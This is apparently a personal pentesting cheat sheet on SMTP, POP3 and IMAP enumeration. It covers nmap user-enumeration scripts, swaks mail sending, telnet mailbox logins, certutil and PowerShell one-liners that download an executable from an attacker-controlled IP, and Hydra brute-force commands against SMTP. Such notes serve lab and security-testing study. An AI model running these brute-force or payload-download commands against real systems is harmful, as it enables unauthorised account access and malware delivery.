## ğŸ§  **SMTP Enumeration & Pentesting Cheat Sheet**

---

### ğŸ” **Basic Enumeration with Nmap**
```
nmap -sV -p 25,110,143,587 <target-ip>
```

- `25`, `587`: SMTP
- `110`: POP3
- `143`: IMAP

```
nmap -p 25 --script smtp-commands,smtp-enum-users <target-ip>
```

### ğŸ“¤ **SMTP â€“ Sending Emails**

**Using `swaks` (Swiss Army Knife for SMTP):**
```
swaks --to Dave.Wizard@supermagicorg.com \
      --from test@supermagicorg.com \
      --server <target-ip> \
      --auth LOGIN \
      --auth-user test@supermagicorg.com \
      --auth-password test \
      --data "Subject: Test\n\nThis is just a test email."

```

**One-liner with attachment:**
```
swaks --to Dave.Wizard@supermagicorg.com --from test@supermagicorg.com --server <ip> --auth LOGIN --auth-user test@supermagicorg.com --auth-password test --attach /path/to/file.txt
```

âœ… _Status codes like `250 OK` and `235 authenticated` mean success._

### ğŸ“¥ **Reading Emails**

- SMTP is **only for sending** emails.
- For **reading**, use:
    - **POP3 (Port 110)** â€“ Downloads and removes from server
    - **IMAP (Port 143)** â€“ Syncs with server


ğŸ›  **Command-line tools to read emails:**

- `telnet <ip> 110` or `telnet <ip> 143`
- `openssl s_client -connect <ip>:110` (POP3s) or `:993` (IMAPs)
- `fetchmail`, `imap-client`, or `mailsync`
---

### ğŸ”“ **Manual IMAP/POP3 Authentication**

**POP3 with Telnet:**
```
telnet <ip> 110
USER test@supermagicorg.com
PASS test
LIST
RETR 1
```
**IMAP with Telnet:**
```
telnet <ip> 143
a login test@supermagicorg.com test
a select inbox
a fetch 1 body[text]
```


### ğŸ” **Attachment Handling**

Swaks can send attachments:
```
swaks --attach /path/to/file.txt
```

Windows download methods:
- `certutil.exe -urlcache -f http://<ip>/file.exe file.exe`
- PowerShell:

```
Invoke-WebRequest -Uri http://<ip>/file.exe -OutFile file.exe
```
### ğŸ§ª **Testing Email Existence**

- If recipient doesn't exist and SMTP is correctly configured, server will reject:
```
250 OK   <- Valid user
550 No such user here <- Invalid user
```

ğŸ”“ **Hydra SMTP Brute Force Example**
```
hydra -L users.txt -P passwords.txt smtp://<target-ip> -V
```
ğŸ§ª **If Port 587 is Used (TLS SMTP)**
```
hydra -L users.txt -P passwords.txt -s 587 -S smtp://<target-ip> -V
```

![[Pasted image 20250421004929.png]]

Note this hydra command failed many times before working because of time out
